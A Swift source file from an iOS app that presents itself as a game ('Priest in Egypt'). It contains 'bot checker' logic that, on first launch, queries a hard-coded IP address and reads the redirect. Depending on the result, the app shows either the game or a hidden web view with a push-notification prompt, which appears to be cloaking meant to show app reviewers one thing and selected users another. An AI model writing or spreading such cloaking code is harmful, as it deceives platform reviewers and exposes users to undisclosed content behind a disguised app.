//
//  DifferentServices.swift
//  Priest in Egypt
//
//  Created by Viktor on 29.06.2020.
//  Copyright © 2020 Viktor. All rights reserved.
//

import UIKit
import OneSignal
import Reachability

class DifferentServices: UIResponder, UIApplicationDelegate,  ReachabilityObserverDelegate {
    var window: UIWindow?
    
    static let shared = DifferentServices()
    fileprivate let defaults = UserDefaults.standard
    
    //MARK: - Reachability
    override init() {
        super.init()
        try? addReachabilityObserver()
    }
    
    deinit {
        removeReachabilityObserver()
    }
    
    func reachabilityChanged(_ isReachable: Bool) {
        if isReachable {
            print("Internet connection")
            delay(bySeconds: 0.1) {
                self.screenLauncher()
            }
        } else {
            print("No internet connection")
            delay(bySeconds: 0.1) {
                self.launchNoInternet()
            }
        }
    }
    
    //MARK: - Bot checker logic
    fileprivate func checkFirstBoot() -> Bool {
        return defaults.object(forKey:"firstBoot") as? Bool ?? true
    }
    
    fileprivate func checkGame() -> Bool {
        return defaults.object(forKey:"game") as? Bool ?? true
    }
    
    fileprivate func checkMainURL() {
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: self, delegateQueue: nil)
        let url = URL(string:  "http://78.47.187.129/5P1WyX8M")!
        let task = session.dataTask(with: url, completionHandler: { _, _, _ in })
        task.resume()
    }
    
    fileprivate func gameOrNot(_ redirectURL: String) {
        if redirectURL == "https://nobot/" {
            defaults.set(false, forKey: "firstBoot")
            defaults.set(false, forKey: "game")
            hasPromptedOneSignal()
            DispatchQueue.main.async {
                self.launchWKweb()
            }
        } else {
            defaults.set(false, forKey: "firstBoot")
            defaults.set(true, forKey: "game")
            DispatchQueue.main.async {
                self.launchTheGame()
            }
        }
    }
    
    //MARK: - OneSignal
    private func hasPromptedOneSignal() {
        let status: OSPermissionSubscriptionState = OneSignal.getPermissionSubscriptionState()
        let hasPrompted = status.permissionStatus.hasPrompted
        if !hasPrompted {
            OneSignal.promptForPushNotifications { hasPrompted in
                OneSignal.addTrigger("prompt_ios", withValue: "true")
            }
        }
        print("hasPrompted = \(hasPrompted)")
    }
    
    //MARK: - UI Launcher
    func screenLauncher() {
        if checkFirstBoot() {
            checkMainURL()
        } else {
            DispatchQueue.main.async {
                if self.checkGame() {
                    self.launchTheGame()
                } else {
                    self.launchWKweb()
                }
            }
        }
    }
}

//MARK: - URLSessionDataDelegate
extension DifferentServices: URLSessionDataDelegate {
    func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest request: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
        guard let redirectURL = request.url  else { return }
        gameOrNot(redirectURL.absoluteString)
        completionHandler(request)
    }
}

//MARK: - GUI
extension DifferentServices {
    private func launchTheGame() {
        window = UIWindow(frame: UIScreen.main.bounds)
        let storyboard = UIStoryboard(name: "Welcome", bundle: .main)
        let initialViewController = storyboard.instantiateViewController(withIdentifier: "WelcomeViewController")
        self.window?.rootViewController = initialViewController
        self.window?.makeKeyAndVisible()
    }
    
    private func launchWKweb() {
        window = UIWindow(frame: UIScreen.main.bounds)
        let storyboard = UIStoryboard(name: "WKweb", bundle: .main)
        let initialViewController = storyboard.instantiateViewController(withIdentifier: "WebViewController")
        self.window?.rootViewController = initialViewController
        self.window?.makeKeyAndVisible()
    }
    
    private func launchNoInternet() {
        window = UIWindow(frame: UIScreen.main.bounds)
        let storyboard = UIStoryboard(name: "NoInternet", bundle: .main)
        let initialViewController = storyboard.instantiateViewController(withIdentifier: "NoInternetViewController")
        self.window?.rootViewController = initialViewController
        self.window?.makeKeyAndVisible()
    }
}
